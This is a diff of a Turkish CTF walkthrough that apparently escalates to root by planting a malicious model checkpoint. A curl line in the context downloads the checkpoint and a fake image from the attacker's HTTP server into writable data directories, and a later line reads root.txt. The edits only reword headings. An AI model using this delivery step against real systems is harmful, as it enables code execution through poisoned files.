@@ -271,7 +271,7 @@ curl -s -o /datastore/processed/dummy.png http://10.10.15.231:8080/dummy.png
 `datawrangler` kullanıcısının `dataops` grup üyeliği sayesinde `/datastore/checkpoints` ve `/datastore/processed` dizinlerine yazma izni olduğunu görüyoruz. Kendi HTTP sunucumuzdan kötücül checkpoint dosyasını ve sahte görüntüyü doğrudan bu dizinlere indiriyoruz.
 
 
-### 20 — Teslimatı Doğrulama
+### 20 — Payload'ın Hedefe Ulaştığını Doğrulama
 
 ![http server log](images/20.png)
 
@@ -305,7 +305,7 @@ cat /root/root.txt
 
 ![root.txt](images/22.png)
 
-Root flag'i okunuyor — makine tamamlandı.
+Makine tamamlandı.
 
 
 
